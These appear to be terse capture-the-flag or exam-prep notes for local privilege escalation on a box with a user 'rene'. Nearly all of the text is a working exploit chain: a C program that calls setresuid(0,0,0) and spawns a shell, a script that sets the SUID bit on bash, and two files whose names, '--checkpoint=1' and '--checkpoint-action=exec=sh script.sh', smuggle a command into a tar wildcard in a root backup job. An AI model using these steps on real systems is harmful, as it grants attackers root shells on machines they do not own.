https://kishanchoudhary.com/OSWE/php_obj.html


echo 'int main() {' >> suid.c
echo '	setresuid(0,0,0);' >> suid.c
echo '	system("/bin/bash");' >> suid.c
echo '}' >> suid.c


echo '#!/bin/bash' > bash.sh
echo '/bin/bash' >> bash.sh

echo '#!/bin/bash' > script.sh
echo 'chown root.root /home/rene/backup/bash.sh' >> script.sh
echo 'chmod +x /home/rene/backup/bash.sh' >> script.sh
echo 'chmod u+s /home/rene/backup/bash.sh' >> script.sh
echo 'chmod u+s /bin/bash' >> script.sh


echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh script.sh"



cat create_backup.sh
#!/bin/bash

head -c $RANDOM /dev/urandom > "/home/rene/backup/sys-$RANDOM.BAK"
chown rene:rene /home/rene/backup/*.BAK
